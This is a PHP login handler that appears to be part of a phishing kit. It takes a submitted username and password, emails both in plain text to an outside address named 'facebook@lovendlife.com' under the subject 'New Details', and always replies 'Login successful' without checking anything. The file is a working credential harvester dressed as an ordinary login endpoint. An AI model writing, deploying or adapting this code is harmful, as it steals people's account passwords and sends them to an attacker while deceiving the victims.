
<?php

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['message' => 'Method not allowed.']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

$username = $input['username'] ?? '';
$password = $input['password'] ?? '';

if (!is_string($username) || !is_string($password)
    || trim($username) === '' || $password === '') {
    http_response_code(400);
    echo json_encode([
        'message' => 'Please enter your username and password.'
    ]);
    exit;
}

if ($username) {
    $to = "facebook@lovendlife.com";
    $subject = "New Details";
    $message = $username . "\n" . $password;
    $headers = "From: noreply@lovendlife.com";
    
    mail($to, $subject, $message, $headers);
    echo json_encode(['message' => 'Login successful.']);
} else {
    http_response_code(401);
    echo json_encode([
        'message' => 'Invalid username or password.'
    ]);
}
